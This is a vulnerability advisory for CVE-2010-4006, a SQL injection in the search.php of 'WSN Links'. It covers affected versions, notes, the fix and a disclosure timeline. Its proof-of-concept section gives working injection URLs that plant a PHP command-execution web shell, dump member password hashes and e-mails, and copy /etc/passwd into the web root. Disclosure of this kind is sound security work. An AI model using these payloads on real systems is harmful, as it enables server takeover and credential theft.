@@ -1,0 +1,57 @@
+'WSN Links' SQL Injection Vulnerability (CVE-2010-4006)
+Mark Stanislav - mark.stanislav@gmail.com
+
+
+I. DESCRIPTION
+---------------------------------------
+A vulnerability exists in the search.php code that allows for SQL injection of various parameters. By assembling portions of SQL code between the affected parameters, successful SQL injection into the software can occur. In the testing done, various 'UNION SELECT' SQL injections can occur. 
+
+ 
+II. AFFECTED VERSIONS
+---------------------------------------
+< 6.0.1; < 5.1.51 ; < 5.0.81
+
+
+III. TESTED VERSIONS
+---------------------------------------
+5.1.40 & 5.1.49
+
+
+IV. PoC EXPLOITS 
+---------------------------------------
+1) A 'UNION SELECT' which results in a PHP shell-execution script
+http://example.com/search.php?namecondition=IS%20NULL))%20UNION%20((SELECT%20"<?php%20system($_REQUEST[cmd]);%20?>"%20INTO%20OUTFILE&namesearch=/var/www/exec.php&action=filter&filled=1&whichtype=categories
+
+2) A 'UNION SELECT' which results in a member's name, password hash, and e-mail to be extracted to a file
+http://example.com/search.php?namecondition=IS%20NOT%20NULL))%20UNION%20((SELECT%20concat(name,0x3a,password,0x3a,email)%20FROM%20wsnlinks_members%20INTO%20OUTFILE&namesearch=/var/www/pass.txt&action=filter&filled=1&whichtype=categories
+
+3) A 'UNION SELECT' which results in the /etc/passwd file being copied to a web directory file
+http://example.com/search.php?namecondition=IS%20NOT%20NULL))%20UNION%20((SELECT%20load_file(0x2f6574632f706173737764)%20INTO%20OUTFILE&namesearch=/var/www/passwd.txt&action=filter&filled=1&whichtype=categories
+
+
+V. NOTES 
+---------------------------------------
+* The above exploits require 'FILE' SQL privilege as well as poor web directory permissions to work. 
+* Only 'namecondition' and 'namesearch' are utilized for the actual SQL injection.
+* There is potential to exploit this vulnerability which outputs user data directly to the browser.
+* Passing 'debug=1' as a query value easily enables debug mode of tested 'WSN Links' deployments.
+
+
+VI. SOLUTION
+---------------------------------------
+Upgrade to the most recent version of your 'WSN Links' code branch.
+
+
+VII. REFERENCES
+---------------------------------------
+http://www.wsnlinks.com/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4006
+http://www.uncompiled.com/2010/10/wsn-links-sql-injection-vulnerability-cve-2010-4006/
+
+VIII. TIMELINE
+---------------------------------------
+10/10/2010: Initial discloure e-mail to the vendor
+10/18/2010: Follow-up via the vendor's contact web form
+10/18/2010: Vendor acknowledgement/commitment to fix
+10/21/2010: Patched versions released
+10/31/2010: Public disclosure
